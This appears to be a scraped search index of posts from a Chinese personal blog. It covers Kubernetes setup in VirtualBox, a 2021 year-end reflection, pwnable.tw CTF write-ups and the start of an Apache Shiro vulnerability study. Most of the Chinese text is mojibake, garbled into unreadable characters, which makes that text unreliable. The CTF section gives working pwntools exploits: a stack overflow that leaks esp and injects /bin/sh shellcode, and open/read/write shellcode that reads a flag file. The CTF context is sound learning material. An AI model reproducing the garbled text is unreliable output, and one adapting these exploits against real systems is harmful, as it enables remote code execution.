å¦‚æœä¸ä½¿ç”¨æ¡¥æ¥æ¨¡å¼, é‚£å°±åªèƒ½ä½¿ç”¨ NAT networkæ¥è¿›è¡Œnodeä¹‹é—´é€šä¿¡+Host Onlyè®©å®¿ä¸»æœºèƒ½å¤Ÿè¿æ¥+NATè®©è™šæ‹Ÿæœºå¯ä»¥è¿æ¥åˆ°å¤–ç½‘å», åœ¨è¿™ç§æƒ…å†µä¸‹, ç¯å¢ƒå°±ä¼šå˜å¾—å¾ˆå¤æ‚, æ‰€ä»¥è¿˜æ˜¯é€‰æ‹©æ¡¥æ¥æ¨¡å¼æ¯”è¾ƒå¥½.\né‚£æ¡¥æ¥æ¨¡å¼æœ‰ä»€ä¹ˆä¸å¥½çš„åœ°æ–¹å—? æœ‰, å¦‚æœä½ çš„å®¿ä¸»æœºå¼€ç€ä»£ç†, æ¡¥æ¥æ¨¡å¼æ˜¯èµ°ä¸äº†ä½ å®¿ä¸»æœºçš„ä»£ç†çš„, å³ä¾¿å¼€å¯äº†Allow LANä¹Ÿæ— æµäºäº‹, é™¤éä½ æ¡¥æ¥åˆ°äº†ä»£ç†è½¯ä»¶çš„è™šæ‹Ÿç½‘å¡ä¸Š, ä½†æ˜¯è¿™æ¡è·¯æˆ‘æ²¡èµ°é€š, æ‰€ä»¥æœ€åé€‰æ‹©äº†åœ¨è·¯ç”±å™¨ä¸Šå®‰è£…clash\nç½‘å¡ç±»å‹ä½¿ç”¨NAT+Host Onlyå°±å¯ä»¥äº†, Host Onlyé‚£é‡Œæœ€å¥½æ–°å»ºä¸€å¼ ç½‘å¡, NATç”¨äºé›†ç¾¤çš„å¯¹å¤–ç½‘ç»œè¯·æ±‚(ä¸‹è½½ä¹‹ç±»çš„), å®¿ä¸»æœºä¸Šä½¿ç”¨clash tunæˆ–è€…daeæˆ–è€…v2rayaéƒ½å¯ä»¥å¼€å¯é€æ˜ä»£ç†æ¥è®©è™šæ‹Ÿæœºå¯ä»¥è¿æ¥å¤–ç½‘.\nç„¶ååœ¨netplanä¸­å¯ç”¨ç¬¬äºŒå¼ ç½‘å¡å¹¶è®¾ç½®é™æ€ip, ä¾‹å¦‚\nnetwork: ethernets: enp0s3: dhcp4: true enp0s8: dhcp4: no addresses: [192.168.59.125/24] version: 2 å…³é—­swap swayoff -a # ä¸´æ—¶ç¦ç”¨ å¦‚æœæ°¸ä¹…ç¦ç”¨, ä¿®æ”¹/etc/fstab\nå®‰è£…ä¾èµ– docker apt-get update \u0026amp;\u0026amp; apt-get install -y \\ apt-transport-https ca-certificates curl software-properties-common gnupg2 curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - add-apt-repository \\ \u0026#34;deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stable\u0026#34; apt-get update \u0026amp;\u0026amp; apt-get install -y \\ containerd.io=1.2.13-1 \\ docker-ce=5:19.03.8~3-0~ubuntu-$(lsb_release -cs) \\ docker-ce-cli=5:19.03.8~3-0~ubuntu-$(lsb_release -cs) cat \u0026gt; /etc/docker/daemon.json \u0026lt;\u0026lt;EOF { \u0026#34;exec-opts\u0026#34;: [\u0026#34;native.cgroupdriver=systemd\u0026#34;], \u0026#34;log-driver\u0026#34;: \u0026#34;json-file\u0026#34;, \u0026#34;log-opts\u0026#34;: { \u0026#34;max-size\u0026#34;: \u0026#34;100m\u0026#34; }, \u0026#34;storage-driver\u0026#34;: \u0026#34;overlay2\u0026#34; } EOF systemctl daemon-reload; systemctl restart docker kubernetes sudo apt-get update \u0026amp;\u0026amp; sudo apt-get install -y apt-transport-https curl curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add - cat \u0026lt;\u0026lt;EOF | sudo tee /etc/apt/sources.list.d/kubernetes.list deb https://apt.kubernetes.io/ kubernetes-xenial main EOF sudo apt-get update; apt-get install -y kubelet=1.25.3-00 kubeadm=1.25.3-00 kubectl=1.25.3-00; apt-mark hold kubelet kubeadm kubectl echo \u0026#39;alias k=kubectl\u0026#39; \u0026gt;\u0026gt; ~/.bashrc ; source ~/.bashrc æ¸…ç† kubeadm reset rm -r ~/.kube /etc/containerd/config.toml /etc/cni/net.d systemctl restart containerd é›†ç¾¤å®‰è£… master setup kubeadm init --pod-network-cidr=10.244.0.0/16 --service-cidr=10.96.0.0/12 --apiserver-advertise-address=192.168.59.126 mkdir -p $HOME/.kube;sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config;sudo chown $(id -u):$(id -g) $HOME/.kube/config ç„¶åå®‰è£…flannel, ä¸‹è½½ https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml , ç„¶åå¾€å…¶ä¸­æ·»åŠ ç½‘å¡çš„åç§°\n... containers: - name: kube-flannel image: docker.io/flannel/flannel:v0.21.4 #image: docker.io/rancher/mirrored-flannelcni-flannel:v0.21.4 command: - /opt/bin/flanneld args: - --ip-masq - --kube-subnet-mgr - --iface=enp0s8 \u0026lt;-- æ·»åŠ  ... ç„¶åæ‰§è¡Œkubectl apply -f kube-flannel.ymlå°±è¡Œ\nworker setup rm /etc/containerd/config.toml systemctl restart containerd docker kubelet kubeadm join 10.0.2.15:6443 --token am85zn.iymt1qn11oel8ktn \\ --discovery-token-ca-cert-hash sha256:ede03b0defa4929ccfcbf6a21ae924cdd6947c5fe6a0090144c3ccea00475344 ç„¶åä¿®æ”¹10-kubeadm.confæ·»åŠ é™æ€ipåœ°å€å°±å®Œæˆäº†.\néƒ¨ç½²åº”ç”¨ æ¥è£…ä¸ªç®€å•çš„åº”ç”¨\napiVersion: apps/v1 kind: Deployment metadata: # éƒ¨ç½²åå­— name: test-k8s spec: replicas: 2 # ç”¨æ¥æŸ¥æ‰¾å…³è”çš„ Podï¼Œæ‰€æœ‰æ ‡ç­¾éƒ½åŒ¹é…æ‰è¡Œ selector: matchLabels: app: test-k8s # å®šä¹‰ Pod ç›¸å…³æ•°æ® template: metadata: labels: app: test-k8s spec: # å®šä¹‰å®¹å™¨ï¼Œå¯ä»¥å¤šä¸ª containers: - name: test-k8s # å®¹å™¨åå­— image: ccr.ccs.tencentyun.com/k8s-tutorial/test-k8s:v1 # é•œåƒ ç„¶åéƒ¨ç½²service\napiVersion: v1 kind: Service metadata: name: test-k8s spec: selector: app: test-k8s type: NodePort ports: - port: 8080 # æœ¬ Service çš„ç«¯å£ targetPort: 8080 # å®¹å™¨ç«¯å£ nodePort: 31000 # èŠ‚ç‚¹ç«¯å£ï¼ŒèŒƒå›´å›ºå®š 30000 ~ 32767, è™šæ‹Ÿæœºå¤–çš„æœºå™¨å¯ä»¥é€šè¿‡è¯¥ç«¯å£è®¿é—®å†…éƒ¨æœåŠ¡ æ¥è®¿é—®ä¸€ä¸‹, é¡ºåˆ©å°±å¥½\n","permalink":"https://dragonbox.top/posts/tech-k8s-setup/","summary":"\u003cp\u003eç¯å¢ƒé—®é¢˜, ä¸€ç”Ÿä¹‹æ•Œ.\u003c/p\u003e","title":"virtualboxä¸­æ­å»ºkubernetesé›†ç¾¤"},{"content":"è¿™æ˜¯ä¸€ç¯‡æ‹–å»¶äº†å¾ˆä¹…çš„å¹´åº¦æ€»ç»“,åœ¨ä¸‹å†³å¿ƒå†™å®ƒçš„æ—¶å€™,æˆ‘å·²ç»ä»è¿‡å¹´å¼€å§‹æ— æ‰€äº‹äº‹åœ°ç©äº†åå‡ å¤©çš„æ¸¸æˆäº†,æœ¬æ¥è¯´å¥½è¦åœ¨è¿‡å¹´é‚£å¤©å†™çš„æ€»ç»“ä¹Ÿä¸€ç›´åˆ°ç°åœ¨æ‰å¼€å§‹åŠ¨ç¬”,ç€å®æ˜¯æƒ­æ„§.\nä»Šå¹´å€¼å¾—è®°å½•çš„ä¸€äº›äº‹ä»¶:\næ¯•ä¸šè®¾è®¡çš„ç»è¿‡ åœ¨æœ¬ç§‘å­¦æ ¡çš„æœ€åæ—¶å…‰ å…¥å­¦ç ”ç©¶ç”Ÿé™¢æ ¡ ä»Šå¹´çš„çŠ¶æ€: ä¾ç„¶åœ¨è¿·èŒ«å’Œçº ç»“ä¹‹ä¸­,ä½†æ˜¯é€æ¸æ„è¯†åˆ°åªè¦è¡ŒåŠ¨èµ·æ¥çš„è¯,è‡ªå·±çš„é“è·¯ä¼šè¶Šæ¥è¶Šæ¸…æ™°çš„.\n21å¹´å¹´åˆåœ¨å®¶çš„æ—¶å€™,æˆ‘åœ¨å†™è‡ªå·±çš„æ¯•ä¸šè®¾è®¡\u0026ndash;ä¸€ä¸ªåŸºäºåŒºå—é“¾çš„å•†å“äº¤æ˜“ç³»ç»Ÿ.åœ¨çœ‹äº†ä¸€äº›bç«™çš„å…³äºvueçš„è§†é¢‘ä¹‹åæˆ‘å†™äº†ä¸€ä¸ªéå¸¸ç®€é™‹çš„å‰ç«¯é¡µé¢,æ¯•ä¸šè®¾è®¡çš„åç«¯éƒ¨åˆ†ä½¿ç”¨äº†koaæ¡†æ¶å¹¶è¿è¡Œåœ¨ganacheç¯å¢ƒä¸­,è‡³äºæ™ºèƒ½åˆçº¦éƒ¨åˆ†çš„å†…å®¹æ€»ä½“ä¸Šåœ¨å›å®¶å‰å°±å†™å·®ä¸å¤šäº†.ä½†å…¶å®è‡ªå·±åŸæœ¬çš„æ‰“ç®—æ˜¯åœ¨å›å®¶ä¹‹å‰å°±æŠŠæ¯•ä¸šè®¾è®¡åšå®Œçš„,ä½†æ˜¯åœ¨ç»å†äº†å®ä¹ è¢«æ‹’äº‹ä»¶ä¹‹åå¿ƒæ€å½»åº•æ‘†çƒ‚,æœ‰ä¸€ç‚¹æ²¡ä¸€ç‚¹çš„åšæ¯•ä¸šè®¾è®¡,ä»¥è‡³äºåˆ°å¯’å‡ç»“æŸååˆèŠ±äº†ä¸€äº›æ—¶é—´æ‰å·®ä¸å¤šç®—å®Œæˆ.\nè®°å¾—ç¬¬ä¸€æ¬¡å†™å®Œæ¯•è®¾è®ºæ–‡ä¹‹åç»™è€å¸ˆçœ‹è¿˜è¢«ç—›éª‚äº†ä¸€é€š,æ‹¿å›å»è®¤è®¤çœŸçœŸçš„è¿›è¡Œäº†å¤§æ”¹,è¿™æ‰æ„è¯†åˆ°æ¯•ä¸šè®¾è®¡æœ€å…³é”®çš„éƒ¨åˆ†æ˜¯æ¯•ä¸šè®ºæ–‡,äºæ˜¯æ¥ä¸‹æ¥çš„æ—¶é—´é‡Œé¢,æ ¼å¼é—®é¢˜å’Œç¯‡å¹…å†…å®¹æˆäº†æˆ‘æœ€å…³æ³¨çš„ä¸œè¥¿.åœ¨è¿™é‡Œä¹Ÿå¿…é¡»æ„Ÿè°¢æˆ‘çš„æŒ‡å¯¼è€å¸ˆåœ¨å‡Œæ™¨æ—¶åˆ†è¿˜ç»™æˆ‘å‘æŒ‡å¯¼æ„è§.\nåˆ°äº†æ¯•ä¸šè®¾è®¡çš„æœ€åé˜¶æ®µ,å…ˆæ˜¯å»é¡¹ç›®ä¸ºå¯¼å‘çš„æ¯•ä¸šè®¾è®¡éªŒæ”¶ç°åœº,åœ¨è¢«çµé­‚è´¨é—®ä¸€å¥\u0026quot;ä½ è¿™ä¸ªç³»ç»Ÿå†œæ°‘èƒ½ç”¨å—\u0026quot;ä¹‹åé»¯ç„¶é€€ä¸‹,ç„¶åæ˜¯åœ¨æ¯•ä¸šç­”è¾©ç¯èŠ‚éå¸¸å¿«é€Ÿè€Œç®€ç•¥åœ°é˜è¿°äº†æˆ‘çš„å·¥ä½œå†…å®¹.ä¹Ÿæ­£æ˜¯åœ¨ç­”è¾©ç¯èŠ‚æˆ‘æ‰å‘ç°æœ‰çš„äººçš„æ¯•è®¾çœŸæ˜¯éå¸¸ç¡¬æ ¸,è™½ç„¶å…¶ä¸­æœ‰äº›æ˜¯æ‹¿ä¹‹å‰åšè¿‡çš„æˆæœæ¥ç”¨çš„,ä¹Ÿæœ‰äººçœŸå°±ç¡¬åˆ’æ°´,ä¸ä»…å®éªŒæ•°æ®æ˜¯æ¨¡æ‹Ÿç”Ÿæˆçš„,æ•´ä¸ªæ¯•è®¾è¿˜æ‹†æˆä¸‰ä¸ªéƒ¨åˆ†ç»™ä¸‰ä¸ªäººåš,çœŸæ˜¯æ— äº†ä¸ªå¤§è¯­.ä¸ç®¡æ€ä¹ˆæ ·,åœ¨ç»“æŸç­”è¾©å›åˆ°å®¿èˆæ¥¼æ´»åŠ¨å®¤ä¸­æ—¶,çœ‹ç€é‚£äº›ç„¦æ€¥è€Œåˆç´§å¼ ç­‰å¾…ç­”è¾©çš„çœ¼ç¥æ—¶,æˆ‘æ‰æ„è¯†åˆ°,éƒ½ç»“æŸäº†,ä¸ä»…è¦å’Œé‚£äº›ç†¬å¤œæ”¹è®ºæ–‡çš„å¤œæ™šè¯´å†è§äº†,ä¹Ÿè¦å’Œé‚£äº›ä¸ºäº†ç»©ç‚¹ç„¦å¤´çƒ‚é¢å¤ä¹ çš„æ—¥å¤œå’Œè€ƒåœºä¸Šç´§å¼ ç­”é¢˜çš„åˆ†ç§’è¯´å†è§äº†.é‚£äº›å› ä¸ºè¯¾ç¨‹å’Œæˆç»©æˆ–æ˜¯ç„¦è™‘æˆ–æ˜¯è¿·èŒ«çš„å²æœˆç»ˆäºè¦å’Œæˆ‘è¯´å†è§äº†,å°½ç®¡æˆ‘å¹¶ä¸è®¨åŒå®ƒä»¬,ç”šè‡³å“ªæ€•æˆ‘æœ‰æ—¶ä¼šå› ä¸ºä¿ç ”åˆ¶åº¦è€Œæ»¡è…¹ç‰¢éªš,å´ä¹Ÿä¸å¾—ä¸æ‰¿è®¤,è¿™äº›ç»å†å·²ç»æˆä¸ºäº†è‡ªå·±çš„çƒ™å°.\néšç€æ¯•ä¸šçš„ä¸´è¿‘,é™çº§äº†çš„å®¤å‹jmä¹Ÿè¦ç¦»å¼€å­¦æ ¡å»å‚åŠ å‡ ä¸ªæœˆçš„å®ä¹ äº†.æˆ‘ä»¬å®¿èˆæœ€åä¸€æ¬¡åƒé¥­æ˜¯åœ¨é£Ÿå ‚äºŒæ¥¼çš„çƒ¤è‚‰åº—ä¸­,ç¬¬äºŒå¤©,å®¿èˆå°±åªå‰©ä¸‹ä¸‰äººäº†.\næ¯•è®¾ç»“æŸåçš„æ—¶é—´é‡Œ,æ—¶è€Œä¼¤æ„Ÿçš„è‡ªå·±æ€¥éœ€ä¸€ä¸ªå¯ä»¥æŠ•å…¥ç²¾åŠ›çš„äº‹æƒ…æ¥æ§åˆ¶è‡ªå·±çš„æƒ…ç»ª,äºæ˜¯å·§åˆä¹‹ä¸‹,æˆ‘æ¥è§¦äº†æ³°æ‹‰ç‘äºš,å¹¶åœ¨2Dä¸–ç•Œé‡Œé¢åº¦è¿‡äº†å¤§å­¦çš„æœ€åæ—¶å…‰,å¦‚ä»Šæƒ³æ¥,ç«Ÿè«åå…¶å¦™åœ°å’Œå¤§ä¸€å¯’å‡ç©é»‘é­‚äºŒæ—¶å€™çš„æ—¶å…‰å‘ç”Ÿäº†å‘¼åº”,å°±å¥½åƒè‡ªå·±å…¶å®ä¸€ç›´éƒ½æ²¡æœ‰æ”¹å˜.\nè‡³æ­¤,æˆ‘çš„å¤§å­¦ç”Ÿæ´»,å…‰è£è°¢å¹•!æ„Ÿè°¢æˆ‘é‡åˆ°çš„æ¯ä¸€ä¸ªè€å¸ˆæ¯ä¸€ä½åŒå­¦æ¯ä¸€ä½å­¦é•¿!æ„Ÿè°¢aoå­å“¥æŸ´å­å“¥å®‰å­å“¥å”è€æ¿å¤©ç”·å“¥æ½¼å¤§ä½¬æºå­å“¥på¸ˆå‚…å¸¦æˆ‘æ‰“CTFè¿˜é™ªæˆ‘æ‰¯duå­,æ„Ÿè°¢æˆ‘çš„æ¯ä¸€ä¸ªå®¤å‹è®©æˆ‘çš„å¤§å­¦æ—¶å…‰å……æ»¡äº†çŸ³ä¹å¿—çš„ç¬‘å£°.\næ¥ä¸‹æ¥æ˜¯æˆ‘è¿›å…¥å›½ç§‘å¤§ä¹‹åçš„ç»å†.åœ¨å…¥å­¦å‰çš„æš‘å‡,æˆ‘ç»å†äº†å¾ˆé•¿æ—¶é—´çš„è¿·èŒ«æœŸ,æƒ³ç€è¦ä¸æ”¾å¼ƒç½‘å®‰æ–¹å‘å§,ä½†æ˜¯å…¥å­¦åå¿™èµ·æ¥äº†ä¹Ÿæ²¡ç©ºæƒ³è¿™ä¹ˆå¤š,åè€Œè¿˜é‡æ–°æŒ¯ä½œå¹¶å®‰æ…°è‡ªå·±è¿™äº›éƒ½æ˜¯æŠ€æœ¯,ä»¥åå¹²ä»€ä¹ˆä¹Ÿéƒ½è¿˜ä¸ä¸€å®š,ç°åœ¨çš„å­¦ä¹ æ–¹å‘å°±å‡­è‡ªå·±å…´è¶£æ¥å°±å¥½äº†,æ¯•ç«Ÿäººå¤ªåŠŸåˆ©ä¼šæ´»å¾—å¾ˆç´¯çš„.è¿™ä¸ªå­¦æœŸä¹Ÿè¯»äº† åšæ—¶é—´çš„æœ‹å‹ è¿™æœ¬ä¹¦,ä¹¦ä¸­è°ˆåˆ°è¯´å…´è¶£ä¸æ˜¯å¤©ç”Ÿçš„,ç­‰åˆ°ä¸€ä¸ªäººæ“…é•¿æŸä¸ªæ–¹å‘ä¹‹åè‡ªç„¶å°±ä¼šå¯¹è¿™ä¸ªæ–¹å‘äº§ç”Ÿçƒ­çˆ±,è®©æˆ‘å¤§å—å¯å‘,ä¸å†è£¹è¶³ä¸å‰.\nåœ¨å›½ç§‘å¤§,é™¤äº†è‡ªå·±ç ”ç©¶ä¹‹å¤–,å¶å°”ä¼šæœ‰ä»å¸ˆå…„é‚£é‡Œæ¥çš„å°ä»»åŠ¡.å‰©ä¸‹çš„å¾ˆå¤šæ—¶é—´éƒ½ä¼šåœ¨è¯¾å†…å’Œè¯¾å¤–æ‰¯çš®è¿˜æœ‰CTFä¸­åº¦è¿‡,å¤§ä½“ä¸Šæ¯”è¾ƒæ‚ é—².å½“ç„¶æœŸæœ«çš„æ—¶å€™å†²ä¸€æ³¢è€ƒè¯•åŠæ ¼æ˜¯è‚¯å®šçš„,ä½†æ˜¯ä¸ä¼šå†åƒæœ¬ç§‘é‚£ä¹ˆå·äº†.ä¸‹åŠä¸ªå­¦æœŸåº”è¯¥å°±è¦ç¡®å®šè‡ªå·±çš„æ–¹å‘äº†,è¿™ä¸ªå¯’å‡ä¼°è®¡ä¹Ÿæ˜¯æœ€åä¸€ä¸ªå¯ä»¥æ‚ é—²ç©æ¸¸æˆçš„å‡æœŸäº†.\nåœ¨å›½ç§‘å¤§è¿˜è®¤è¯†äº†å¾ˆå¤šå¤§ä½¬,æœ‰å¹´çºªè½»è½»å‘é¡¶ä¼šçš„å®¤å‹,ä¹Ÿæœ‰ç‚’å¸é£ç”Ÿæ°´èµ·çš„éš”å£è€å“¥,çœŸæ˜¯æœ›å°˜è«åŠ.è‡ªå·±ä¹ŸåŠ å…¥äº†neseçš„ä¹™é˜Ÿ,è™½ç„¶ä¸Šæ¬¡æ¯”èµ›è¿˜æ˜¯å·®ä¸€ç‚¹å°±å¯ä»¥è¿›ç”²é˜Ÿäº†,ä½†æ˜¯è¿™å­¦æœŸè·Ÿç€æ‰“æ¯”èµ›ç€å®å­¦ä¹ åˆ°äº†å¾ˆå¤š.\né‚£ä¹ˆ,æ–°å¹´ä¹Ÿè¦ç»§ç»­åŠªåŠ›å‘€,æ—…è¡Œè€…!\n","permalink":"https://dragonbox.top/posts/gossip-2021-summary/","summary":"\u003cp\u003eè¿™æ˜¯ä¸€ç¯‡æ‹–å»¶äº†å¾ˆä¹…çš„å¹´åº¦æ€»ç»“,åœ¨ä¸‹å†³å¿ƒå†™å®ƒçš„æ—¶å€™,æˆ‘å·²ç»ä»è¿‡å¹´å¼€å§‹æ— æ‰€äº‹äº‹åœ°ç©äº†åå‡ å¤©çš„æ¸¸æˆäº†,æœ¬æ¥è¯´å¥½è¦åœ¨è¿‡å¹´é‚£å¤©å†™çš„æ€»ç»“ä¹Ÿä¸€ç›´åˆ°ç°åœ¨æ‰å¼€å§‹åŠ¨ç¬”,ç€å®æ˜¯æƒ­æ„§.\u003c/p\u003e","title":"2021å¹´åº¦æ€»ç»“"},{"content":"å°è¯•å­¦pwn,æ”¾å¼ƒå­¦pwn\nstart ä¸‹è½½, åç¼–è¯‘è·å¾—å¦‚ä¸‹ä»£ç \n.text:08048060 public _start .text:08048060 _start proc near ; DATA XREF: LOAD:08048018â†‘o .text:08048060 push esp .text:08048061 push offset _exit .text:08048066 xor eax, eax .text:08048068 xor ebx, ebx .text:0804806A xor ecx, ecx .text:0804806C xor edx, edx .text:0804806E push \u0026#39;:FTC\u0026#39; .text:08048073 push \u0026#39; eht\u0026#39; .text:08048078 push \u0026#39; tra\u0026#39; .text:0804807D push \u0026#39;ts s\u0026#39; .text:08048082 push 2774654Ch .text:08048087 mov ecx, esp ; addr .text:08048089 mov dl, 14h ; len .text:0804808B mov bl, 1 ; fd .text:0804808D mov al, 4 .text:0804808F int 80h ; LINUX - sys_write .text:08048091 xor ebx, ebx .text:08048093 mov dl, 3Ch ; \u0026#39;\u0026lt;\u0026#39; .text:08048095 mov al, 3 .text:08048097 int 80h ; LINUX - .text:08048099 add esp, 14h .text:0804809C retn .text:0804809C _start endp ; sp-analysis failed espå‹æ ˆ, è¿”å›åœ°å€å‹æ ˆ æ¸…ç©ºäº†eax, ebx, ecx, edx å››æ¬¡pushå‹å…¥å­—ç¬¦ä¸² Letâ€™s start the CTF : å°†æ ˆé¡¶åœ°å€ä½œä¸ºå‚æ•°ç§»åˆ°ecxä¸­ å°†20ç§»åˆ°dl (edxçš„ä½å…«ä½)ä¸­, 20 å°±æ˜¯ä¸Šé¢å­—ç¬¦ä¸²çš„é•¿åº¦ sys_writeå°†è¦å‘stdoutå†™å…¥, æ‰€ä»¥å°†1ç§»åŠ¨åˆ°bl (ebxçš„ä½8ä½)ä¸­ å› ä¸ºè¦è°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨ä¸ºsys_write, æ‰€ä»¥å°†å…¶ç³»ç»Ÿå‘¼å«å·ä¹Ÿå°±æ˜¯4ç§»åŠ¨åˆ°al (eaxçš„ä½å…«ä½)ä¸­ ä½¿ç”¨ int 80h æ¥è°ƒç”¨ä¸­æ–­, ç›¸å½“äºcall, å‚æ•°ä¸ºå‰é¢çš„é‚£äº›, è‡³æ­¤æ ‡å‡†è¾“å‡ºä¸­å†™å…¥äº†å­—ç¬¦ä¸² ebxç½®0, è¡¨ç¤ºä»æ ‡å‡†è¾“å…¥ä¸­è¯»å– å°†60ä¼ å…¥edx, è¡¨ç¤ºè¯»å–60ä¸ªå­—èŠ‚ (æ³¨æ„è¿™äº›å­—èŠ‚ä¼šè¦†ç›–åŸå…ˆæ ˆä¸­çš„å­—ç¬¦ä¸²) ç³»ç»Ÿå‘¼å«å·ç½®3, è¡¨ç¤ºä½¿ç”¨sys_readè°ƒç”¨ int 80hæ¥è°ƒç”¨ä¸­æ–­, å°†å†…å®¹è¯»å…¥ecxä¸­çš„åœ°å€ä¹Ÿå°±æ˜¯æ ˆé¡¶ä¸­ å°†espå¢åŠ 20å­—èŠ‚ å¼¹æ ˆå¹¶æ‰§è¡Œå¼¹å‡ºåœ°å€æ‰€æŒ‡å‘çš„æŒ‡ä»¤ æ”»å‡»æ€è·¯ä¸º:\nç¨‹åºå‘æ ˆä¸­å†™å…¥æ•°æ®, ç„¶åå†å°†espå¢åŠ 20ç„¶åå¼¹æ ˆæ‰§è¡Œ, ä½†æ˜¯æˆ‘ä»¬è¯»å–çš„æ•°æ®æœ€å¤§æœ‰60å­—èŠ‚, é‚£ä¹ˆå¯ä»¥è¯»å…¥è¶…è¿‡20å­—èŠ‚çš„æ•°æ®, å¹¶æ§åˆ¶å¼¹æ ˆæ‰§è¡Œçš„æŒ‡ä»¤. å¦‚æœè®©å¼¹å‡ºæ‰§è¡Œçš„æŒ‡ä»¤ä¸ºsys_writeéƒ¨åˆ†çš„ä»£ç , é‚£ä¹ˆå°±ä¼šæ³„æ¼æœ€å¼€å§‹å‹æ ˆçš„espåœ°å€ æ³„æ¼espåœ°å€ä¹‹å, è¿›è¡Œç¬¬äºŒæ¬¡æ”»å‡», åŒæ ·æ˜¯å¼¹å‡ºæ‰§è¡Œsys_write, æ¥ç€ä»£ç ç»§ç»­æ‰§è¡Œåˆ°sys_read, è¿™é‡Œè®©ç¨‹åºè¯»å…¥20ä¸ªåƒåœ¾å­—ç¬¦, æ¥ä¸‹æ¥ç¨‹åºä¼šå°†espå¢åŠ 20, ç„¶åå†æ¬¡å¼¹æ ˆæ‰§è¡Œ, è¿™æ¬¡å¼¹æ ˆå‡ºæ¥è¦æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€ åº”è¯¥æ˜¯shellcodeçš„åœ°å€, é‚£ä¹ˆshellcodeçš„åœ°å€åº”è¯¥æ˜¯å¤šå°‘å‘¢? åº”è¯¥æ˜¯æœ€å¼€å§‹çš„espåœ°å€åŠ ä¸Š20, è¿™é‡Œæˆ‘ç¬¬ä¸€æ¬¡çœ‹çš„æ—¶å€™æƒ³äº†å¥½ä¹…, å¯ä»¥çœ‹è¿™ä½å¸ˆå‚…çš„å›¾å¸®åŠ©ç†è§£https://xuanxuanblingbling.github.io/ctf/pwn/2019/08/30/start/ expå¦‚ä¸‹\nfrom pwn import * p = remote(\u0026#39;chall.pwnable.tw\u0026#39;, 10000) # p = process(\u0026#39;./start\u0026#39;) shellcode= \u0026#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#39; pad = \u0026#39;a\u0026#39;*20 # pad = pad.decode(\u0026#39;utf8\u0026#39;) addr = 0x8048087 payload1 = pad + p32(addr).decode(\u0026#39;unicode_escape\u0026#39;) p.send(payload1) p.recvuntil(\u0026#34;:\u0026#34;) oldesp = u32(p.recv(4)) shellcode_addr = oldesp + 20 payload2 = pad + p32(shellcode_addr).decode(\u0026#39;unicode_escape\u0026#39;) + shellcode p.send(payload2) p.interactive() orw é€†å‘å¾—åˆ°æºä»£ç \nint __cdecl main(int argc, const char **argv, const char **envp) { orw_seccomp(); printf(\u0026#34;Give my your shellcode:\u0026#34;); read(0, \u0026amp;shellcode, 0xC8u); ((void (*)(void))shellcode)(); return 0; } orw_seccomp è¯´æ˜¯é™åˆ¶æ‰§è¡Œçš„å‡½æ•°çš„, é¢˜ç›®è¯´åªèƒ½æ‰§è¡Œsys_open sys_read sys_write. ç„¶åæ¥ä¸‹æ¥ç¨‹åºè¯»å–äº†shellcodeå¹¶ä¸”æ‰§è¡Œ. æ‰€ä»¥å‘ç¨‹åºå‘é€asmä»£ç , å…ˆå¯¹flagæ–‡ä»¶ä½¿ç”¨sys_open, ç„¶åç”¨sys_readè¯»å–å†…å®¹, æœ€åä½¿ç”¨sys_write å°†å†…å®¹å†™åˆ°æ ‡å‡†è¾“å‡ºä¸­.\nfrom pwn import * context(arch=\u0026#39;i386\u0026#39;,os=\u0026#39;linux\u0026#39;) #context(log_level=\u0026#39;debug\u0026#39;) io = remote(\u0026#39;chall.pwnable.tw\u0026#39;,10001) open_code = \u0026#39;\u0026#39;\u0026#39; mov eax, 0x5; push 0x00006761; push 0x6c662f77; push 0x726f2f65; push 0x6d6f682f; mov ebx,esp; xor ecx,ecx; xor edx,edx; int 0x80; \u0026#39;\u0026#39;\u0026#39; read_code = \u0026#39;\u0026#39;\u0026#39; mov ecx, ebx; mov ebx, eax; mov eax, 0x3; mov edx, 0x60; int 0x80; \u0026#39;\u0026#39;\u0026#39; write_code = \u0026#39;\u0026#39;\u0026#39; mov eax, 0x4; mov ebx, 0x1; int 0x80; \u0026#39;\u0026#39;\u0026#39; payload = asm(open_code+read_code+write_code) io.recvuntil(\u0026#39;:\u0026#39;) io.send(payload) io.interactive() ","permalink":"https://dragonbox.top/posts/sec-pwnable/","summary":"\u003cp\u003eå°è¯•å­¦pwn,æ”¾å¼ƒå­¦pwn\u003c/p\u003e","title":"pwnableå°è¯•"},{"content":" è®°å½•shiroæ¼æ´å­¦ä¹ çš„è¿‡ç¨‹, å‚è€ƒhttps://saucer-man.com/information_security/396.html, å¹¶åœ¨æ¼æ´åˆ†æåŸºç¡€ä¸Šç¼–å†™æ£€æµ‹è„šæœ¬\nç¯å¢ƒæ­å»º git clone https://github.com/apache/shiro.git cd shiro git checkout shiro-root-1.2.4 è®¾ç½®shiro/samples/web/pom.xml, æ·»åŠ ç‰ˆæœ¬1.2\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javax.servlet\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jstl\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;runtime\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; ä¸ºtomcat8æ–‡ä»¶æ·»åŠ æƒé™\nsudo chmod -R 755 /var/lib/tomcat8 sudo chmod -R 755 /etc/tomcat8 ä½¿ç”¨ideaæ‰“å¼€shiro/samples/webé¡¹ç›®, ç­‰å¾…mavené¡¹ç›®ä¾èµ–ä¸‹è½½å®Œæˆ, ç¼–è¾‘é…ç½®\nè¿›å…¥Deployment, æ·»åŠ artifact\nå¯åŠ¨é¡¹ç›®, çœ‹åˆ°ä¸‹é¢çš„é¡µé¢å°±è¯´æ˜ç¯å¢ƒæ­å»ºå®Œæˆäº†\næ¼æ´è°ƒè¯• ç™»é™†è¿‡ç¨‹ é¦–å…ˆçœ‹ç™»é™†è¿‡ç¨‹, 